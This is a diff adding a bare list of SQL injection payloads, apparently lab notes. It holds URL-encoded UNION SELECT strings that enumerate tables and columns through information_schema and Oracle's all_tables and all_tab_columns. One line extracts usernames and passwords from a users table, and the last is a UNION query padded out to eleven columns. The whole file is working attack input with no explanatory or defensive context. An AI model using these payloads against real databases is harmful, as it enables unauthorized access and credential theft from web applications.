@@ -1,0 +1,10 @@
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users'--
+'+UNION+SELECT name||' '||price,released from products--
+
+Oracle
+'+UNION+SELECT+table_name,NULL from all_tables--
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_DNVOWU'--
+'+UNION+SELECT+USERNAME_AZZBXE,+PASSWORD_AAOHAJ+FROM+USERS_DNVOWU--
+
+SELECT * FROM XYZ_TABLE WHERE CAT=1 union select all 1,table_name,3,4,5,6,7,8,9,10,11 from information_schema --
